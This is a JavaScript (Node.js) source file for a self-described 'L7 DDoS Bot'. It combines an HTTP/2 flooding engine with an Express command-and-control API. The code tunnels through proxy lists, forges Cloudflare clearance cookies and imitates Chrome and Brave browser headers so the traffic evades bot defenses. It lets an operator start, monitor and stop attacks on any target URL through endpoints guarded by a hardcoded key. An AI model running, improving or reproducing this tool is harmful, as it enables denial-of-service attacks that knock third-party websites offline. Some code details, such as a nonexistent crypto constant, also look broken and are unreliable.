// ==++==
// L7 BOT - CODESPACE API EDITION (FULL DDOS ENGINE)
// GIỮ NGUYÊN 100% LOGIC GỐC TỪ l.js
// ==++==

const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const https = require('https');
const os = require('os');
const axios = require('axios');
const crypto = require('crypto');
const { exec } = require('child_process');
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');

// ==================== CẤU HÌNH C2 ====================
const PORT = process.env.PORT || 3000;
const API_KEY = 'quancncmiku';
let activeAttacks = new Map();
let attackCounter = 0;

// ==================== CODE GỐC TỪ l.js (GIỮ NGUYÊN) ====================
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {})
    .on('unhandledRejection', function (e) {})
    .on('warning', e => {});

const statusesQ = []
let statuses = {}
let isFull = false;
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function cc(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0
    let payload = Buffer.alloc(0)
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)
        if (payload.length + offset != length) return null
    }
    return { streamId, length, type, flags, payload }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function handleQuery(query, url, randomPathSuffix, timestampString) {
    if (query === '1') {
        return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        return url.pathname + randomPathSuffix;
    } else if (query === '3') {
        return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    } else {
        return url.pathname;
    }
}

// ============= LOAD PROXY ========
function loadProxies() {
    try {
        const proxyFile = 'vn.txt';
        if (!fs.existsSync(proxyFile)) return [];
        const data = fs.readFileSync(proxyFile, 'utf8');
        return data.split('\n').filter(l => l.trim() && l.includes(':'));
    } catch (err) {
        return [];
    }
}

function startAttack(method, target, time, threads, rate, attackId, query, bfmFlag, cookieValue, refererValue, randrate, customHeaders) {
    console.log(`[ATTACK #${attackId}] Starting: ${method} ${target} - ${time}s - ${threads} threads - ${rate} req/s`);
    
    const url = new URL(target);
    const proxyList = loadProxies();
    
    if (proxyList.length === 0) {
        console.log(`[ATTACK #${attackId}] No proxies found!`);
        return;
    }
    
    let hcookie = '';
    if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
        hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
    }
    if (cookieValue) {
        if (cookieValue === '%RAND%') {
            hcookie = hcookie ? `${hcookie}; ${cc(6, 6)}` : cc(6, 6);
        } else {
            hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
        }
    }
    
    let randomPathSuffix = '';
    setInterval(() => {
        randomPathSuffix = `${getRandomChar()}`;
    }, 3333);
    
    function getRandomChar() {
        const alphabet = 'abcdefghijklmnopqrstuvwxyz';
        return alphabet.charAt(Math.floor(Math.random() * alphabet.length));
    }
    
    // Fork workers
    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        worker.send({
            type: 'start',
            attackId,
            method,
            target,
            time,
            rate: Math.floor(rate / threads),
            proxyList,
            hcookie,
            randomPathSuffix,
            query,
            refererValue,
            randrate,
            customHeaders
        });
    }
    
    setTimeout(() => {
        console.log(`[ATTACK #${attackId}] Finished`);
        for (const id in cluster.workers) {
            if (cluster.workers[id]) cluster.workers[id].kill();
        }
    }, time * 1000);
}

if (cluster.isWorker) {
    process.on('message', (msg) => {
        if (msg.type === 'start') {
            const { attackId, method, target, time, rate, proxyList, hcookie, randomPathSuffix, query, refererValue, randrate, customHeaders } = msg;
            const url = new URL(target);
            
            const go = () => {
                const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
                const [proxyHost, proxyPort] = proxy.split(':');
                
                if (!proxyPort || isNaN(proxyPort)) {
                    setTimeout(go, 10);
                    return;
                }
                
                let tlsSocket;
                const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
                    netSocket.once('data', () => {
                        tlsSocket = tls.connect({
                            socket: netSocket,
                            ALPNProtocols: ['h2', 'http/1.1'],
                            servername: url.host,
                            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                            secure: true,
                            minVersion: 'TLSv1.2',
                            maxVersion: 'TLSv1.3',
                            rejectUnauthorized: false
                        }, () => {
                            if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                                tlsSocket.end();
                                return;
                            }
                            
                            let streamId = 1;
                            let data = Buffer.alloc(0);
                            let hpack = new HPACK();
                            hpack.setTableSize(4096);
                            
                            const updateWindow = Buffer.alloc(4);
                            updateWindow.writeUInt32BE(custom_update, 0);
                            
                            const frames = [
                                Buffer.from(PREFACE, 'binary'),
                                encodeFrame(0, 4, encodeSettings([
                                    [1, custom_table],
                                    [2, 0],
                                    [4, custom_window],
                                    [6, custom_header],
                                ])),
                                encodeFrame(0, 8, updateWindow)
                            ];
                            
                            tlsSocket.write(Buffer.concat(frames));
                            
                            let currentRate = rate;
                            if (randrate !== undefined) {
                                currentRate = getRandomInt(1, 64);
                            }
                            
                            const sendRequests = () => {
                                if (tlsSocket.destroyed) return;
                                
                                const browserVersion = getRandomInt(120, 128);
                                const fwfw = ['Google Chrome', 'Brave'];
                                const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                                
                                let brandValue;
                                if (browserVersion === 120) {
                                    brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                                } else if (browserVersion === 121) {
                                    brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                                } else if (browserVersion === 122) {
                                    brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                                } else if (browserVersion === 123) {
                                    brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                                } else if (browserVersion === 124) {
                                    brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                                } else if (browserVersion === 125) {
                                    brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                                } else if (browserVersion === 126) {
                                    brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                                } else if (browserVersion === 127) {
                                    brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                                } else {
                                    brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                                }
                                
                                const isBrave = wfwf === 'Brave';
                                const acceptHeaderValue = isBrave
                                    ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
                                const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
                                const secChUa = `${brandValue}`;
                                const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
                                
                                const customHeadersArray = [];
                                if (customHeaders) {
                                    const customHeadersList = customHeaders.split('#');
                                    for (const header of customHeadersList) {
                                        const [name, value] = header.split(':').map(part => part?.trim());
                                        if (name && value) {
                                            customHeadersArray.push({ [name.toLowerCase()]: value });
                                        }
                                    }
                                }
                                
                                for (let i = 0; i < currentRate; i++) {
                                    const headers = [
                                        [":method", method],
                                        [":authority", url.hostname],
                                        [":scheme", "https"],
                                        [":path", query ? handleQuery(query, url, randomPathSuffix, timestampString) : url.pathname],
                                        ["accept", acceptHeaderValue],
                                        ["accept-encoding", "gzip, deflate, br"],
                                        ["accept-language", langValue],
                                        ["cache-control", "max-age=0"],
                                        ["sec-ch-ua", secChUa],
                                        ["sec-ch-ua-mobile", "?0"],
                                        ["sec-ch-ua-platform", '"Windows"'],
                                        ["sec-fetch-dest", "document"],
                                        ["sec-fetch-mode", "navigate"],
                                        ["sec-fetch-site", "none"],
                                        ["sec-fetch-user", "?1"],
                                        ["upgrade-insecure-requests", "1"]
                                    ];
                                    
                                    if (hcookie) {
                                        headers.push(["cookie", hcookie]);
                                    }
                                    if (currentRefererValue) {
                                        headers.push(["referer", currentRefererValue]);
                                    }
                                    
                                    for (const custom of customHeadersArray) {
                                        for (const [k, v] of Object.entries(custom)) {
                                            headers.push([k, v]);
                                        }
                                    }
                                    
                                    const packed = Buffer.concat([
                                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                        hpack.encode(headers)
                                    ]);
                                    
                                    tlsSocket.write(encodeFrame(streamId, 1, packed, 0x25));
                                    streamId += 2;
                                }
                                
                                setTimeout(sendRequests, 1000 / currentRate);
                            };
                            
                            sendRequests();
                        });
                    });
                    
                    netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
                });
                
                netSocket.on('error', () => {});
                netSocket.on('close', () => {
                    if (tlsSocket) tlsSocket.end();
                });
            };
            
            for (let i = 0; i < 50; i++) {
                setTimeout(go, i * 10);
            }
            
            setTimeout(() => process.exit(0), time * 1000);
        }
    });
}

// ==================== EXPRESS API SERVER (C2) ====================
if (cluster.isMaster) {
    const app = express();
    app.use(cors());
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    
    const auth = (req, res, next) => {
        const apiKey = req.headers['x-api-key'] || req.query.key;
        if (apiKey !== API_KEY) {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        next();
    };
    
    app.get('/', (req, res) => {
        res.json({
            status: 'online',
            bot: 'L7 DDoS Bot - Codespace Edition',
            version: '3.0',
            uptime: process.uptime(),
            activeAttacks: activeAttacks.size
        });
    });
    
    app.post('/attack', auth, (req, res) => {
        let { method, target, time, threads, rate, query, bfm, cookie, referer, randrate, headers } = req.body;
        
        if (!method || !target || !time || !threads || !rate) {
            return res.status(400).json({ error: 'Missing parameters: method, target, time, threads, rate' });
        }
        
        const proxyCount = loadProxies().length;
        if (proxyCount === 0) {
            return res.status(400).json({ error: 'No proxies found in vn.txt' });
        }
        
        attackCounter++;
        const attackId = attackCounter;
        
        activeAttacks.set(attackId, {
            id: attackId,
            method, target, time, threads, rate,
            startTime: Date.now(),
            proxies: proxyCount
        });
        
        setTimeout(() => {
            startAttack(method, target, parseInt(time), parseInt(threads), parseInt(rate), attackId, query, bfm, cookie, referer, randrate, headers);
        }, 100);
        
        res.json({
            success: true,
            attackId: attackId,
            message: `Attack #${attackId} started`,
            target: target,
            duration: time,
            threads: threads,
            rate: rate,
            proxies: proxyCount
        });
    });
    
    app.post('/stop/:id', auth, (req, res) => {
        const id = parseInt(req.params.id);
        if (!activeAttacks.has(id)) {
            return res.status(404).json({ error: `Attack #${id} not found` });
        }
        for (const wid in cluster.workers) {
            if (cluster.workers[wid]) cluster.workers[wid].kill();
        }
        activeAttacks.delete(id);
        res.json({ success: true, message: `Attack #${id} stopped` });
    });
    
    app.post('/stopall', auth, (req, res) => {
        for (const wid in cluster.workers) {
            if (cluster.workers[wid]) cluster.workers[wid].kill();
        }
        activeAttacks.clear();
        res.json({ success: true, message: 'All attacks stopped' });
    });
    
    app.get('/status', auth, (req, res) => {
        const attacks = [];
        activeAttacks.forEach((a, id) => {
            attacks.push({
                id: id,
                target: a.target,
                method: a.method,
                time: a.time,
                threads: a.threads,
                rate: a.rate,
                elapsed: Math.floor((Date.now() - a.startTime) / 1000),
                proxies: a.proxies
            });
        });
        res.json({
            online: true,
            uptime: process.uptime(),
            activeAttacks: activeAttacks.size,
            attacks: attacks,
            proxyCount: loadProxies().length
        });
    });
    
    app.get('/proxy', auth, (req, res) => {
        const proxies = loadProxies();
        res.json({ count: proxies.length, proxies: proxies.slice(0, 20) });
    });
    
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`
╔════════════════════════════════════════════════════════════╗
║           L7 DDoS BOT - CODESPACE API EDITION             ║
║                    QUÂN DEV - FULL ENGINE                  ║
╠════════════════════════════════════════════════════════════╣
║  🚀 API Server: http://localhost:${PORT}                    ║
║  🔑 API Key: ${API_KEY}                                      ║
║  📦 Proxy loaded: ${loadProxies().length}                    ║
╚════════════════════════════════════════════════════════════╝
        `);
    });
    
    for (let i = 0; i < 2; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.id} died, restarting...`);
        cluster.fork();
    });
}